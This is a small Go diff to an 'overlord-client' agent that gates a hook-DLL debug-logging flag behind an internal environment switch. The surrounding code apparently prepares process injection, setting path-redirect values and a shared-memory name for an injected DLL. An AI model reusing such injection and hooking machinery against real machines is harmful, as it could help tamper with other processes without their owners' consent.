@@ -18,6 +18,7 @@ import (
 	"unicode/utf16"
 	"unsafe"
 
+	"overlord-client/cmd/agent/internal/overlordenv"
 	"overlord-client/cmd/agent/wininterop"
 
 	"golang.org/x/sys/windows"
@@ -1363,7 +1364,7 @@ func buildEnvironmentBlock(searchPath, replacePath, shmName string, dllSize int)
 	}
 	// Enable hook-side file logging; the oblivious DLL writes per-process trace
 	// logs to %TEMP%\Overlord\backstage\BackstageInjection-debug-<pid>.log.
-	if os.Getenv("BACKSTAGE_DEBUG_LOG") != "0" {
+	if overlordenv.Enabled && overlordenv.Getenv("BACKSTAGE_DEBUG_LOG") != "0" {
 		extra = append(extra, "BackstageInjectionDebug=1")
 	}
 	if shmName != "" {
